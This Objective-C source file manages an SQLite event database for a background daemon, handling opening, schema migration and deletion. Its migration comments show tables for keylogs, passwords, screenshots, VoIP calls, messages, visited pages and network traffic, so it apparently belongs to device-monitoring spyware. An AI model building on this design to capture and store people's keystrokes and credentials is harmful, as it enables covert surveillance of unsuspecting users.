//
//  DatabaseManager.m
//  FxSqLite
//
//  Created by Makara Khloth on 8/29/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "DatabaseManager.h"
#import "DatabaseSchema.h"
#import "FxDbException.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"

#import <sqlite3.h>
#import <Foundation/NSPathUtilities.h>

@interface DatabaseManager (private)

- (void) createDBFileName;

@end

@implementation DatabaseManager

- (id) init
{
	if (self = [super init])
	{
		sqlite3Database = NULL;
		dbOpen = FALSE;
	}
    [self createDBFileName];
	return (self);
}

- (void) dealloc
{
	[self closeDb];
    [dbSchema release];
	[dbFileName release];
	[super dealloc];
}

- (void) openDB
{
	if (!dbOpen)
	{
		NSFileManager* fileManager = [NSFileManager defaultManager];
		BOOL dbExist = [fileManager fileExistsAtPath:dbFileName];
		
		if (!dbExist)
		{
			[fileManager createFileAtPath:dbFileName contents:NULL attributes:NULL];
			
			// Open database file
			NSInteger sqliteError = sqlite3_open([dbFileName cStringUsingEncoding:NSASCIIStringEncoding], &sqlite3Database);
			if (sqliteError != SQLITE_OK)
			{
				FxDbException* dbException = [FxDbException exceptionWithName:@"Open Sqlite3 database" andReason:@"Cannot create new db file"];
				dbException.errorCode = sqliteError;
				@throw dbException;
			}
			else
			{
				dbSchema = [[DatabaseSchema alloc] initWithDatabaseManager:self];
				[dbSchema createDatabaseSchema];
			}
		}
		else
		{
			// Open database file
			NSInteger sqliteError = sqlite3_open([dbFileName cStringUsingEncoding:NSASCIIStringEncoding], &sqlite3Database);
			if (sqliteError != SQLITE_OK)
			{
				FxDbException* dbException = [FxDbException exceptionWithName:@"Open Sqlite3 database" andReason:@"Cannot open existing db file"];
				dbException.errorCode = sqliteError;
				@throw dbException;
			}
			else
			{
				dbSchema = [[DatabaseSchema alloc] initWithDatabaseManager:self];
                [dbSchema createDatabaseSchemaV2];		// Add table VoIP
				[dbSchema createDatabaseSchemaV3];		// Add table KeyLog, PageVisited
                [dbSchema createDatabaseSchemaV4];      // Add table Password, App Password
                [dbSchema createDatabaseSchemaV5];      // Add table UsbConnection, FileTransfer, Logon, AppUsage, IMMacOS, EmailMacOS, Screenshot
                [dbSchema createDatabaseSchemaV6];      // Add table FileActivity
                [dbSchema createDatabaseSchemaV7];      // Add table NetworkTraffic, NetworkConnectionMacOS
                [dbSchema createDatabaseSchemaV8];      // Add table PrintJob
                [dbSchema createDatabaseSchemaV9];      // Add table AppScreenShot
                [dbSchema createDatabaseSchemaV10];     // Add table VoIPCallTag
                [dbSchema createDatabaseSchemaV11];     // Alter table PageVisited, AppScreenShot
			}
		}
		dbOpen = TRUE;
	}
}

- (void) closeDb
{
	if (dbOpen)
	{
		sqlite3_close(sqlite3Database);
	}
	dbOpen = FALSE;
}

- (void) dropDB {
    [self closeDb];
    [dbSchema release];
	dbSchema = nil;
    NSFileManager* fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:dbFileName]) {
        if ([fileManager isDeletableFileAtPath:dbFileName]) {
            NSError* error = nil;
            BOOL success = [fileManager removeItemAtPath:dbFileName error:&error];
            if (!success) {
                FxDbException* dbException = [FxDbException exceptionWithName:@"Drop Sqlite3 database" andReason:[error localizedDescription]];
				dbException.errorCode = [error code];
				@throw dbException;
            }
        }
    }
    [self openDB];
}

- (sqlite3*) sqlite3db
{
	return (sqlite3Database);
}

- (NSString*) dbFullName
{
    return dbFileName;
}

- (void) createDBFileName {
    NSString* daemonPrivateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *path = [NSString stringWithFormat:@"%@erm/", daemonPrivateHome];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:path];
	dbFileName = [[NSString alloc] initWithFormat:@"%@fxevents.db", path];
	DLog(@"dbFileName full path = %@", dbFileName)
}

- (NSUInteger) lastInsertRowId
{
	NSUInteger lastRowId = 0;
	if (dbOpen)
	{
		lastRowId = sqlite3_last_insert_rowid(sqlite3Database);
	}
	return lastRowId;
}

- (DatabaseSchema*) databaseSchema {
    return (dbSchema);
}
@end
